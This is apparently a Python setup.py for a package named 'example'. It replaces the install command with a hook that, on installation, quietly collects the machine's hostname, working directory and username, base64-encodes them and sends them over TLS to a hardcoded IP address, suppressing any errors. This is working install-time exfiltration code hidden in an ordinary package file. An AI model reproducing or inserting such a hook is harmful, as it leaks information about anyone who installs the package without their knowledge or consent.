import socket, getpass, os, ssl, json, base64
from setuptools import setup
from setuptools.command.install import install
class Hook(install):
    def run(self):
        TARGET = '192.168.1.1'
        try:
            hostname = socket.gethostname()
            cwd = os.getcwd()
            username = getpass.getuser()
            payload = {'hostname': hostname, 'cwd': cwd, 'username': username}
            params = base64.b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8')
            request = f'GET /?x={params} HTTP/1.1\r\nHost:{TARGET}\r\n\r\n'
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            s = socket.socket()
            s_sock = context.wrap_socket(s, server_hostname=TARGET)
            s_sock.connect((TARGET, 443))
            s_sock.send(str.encode(request))
        except Exception:
            pass
setup(name='example', cmdclass={'install': Hook})
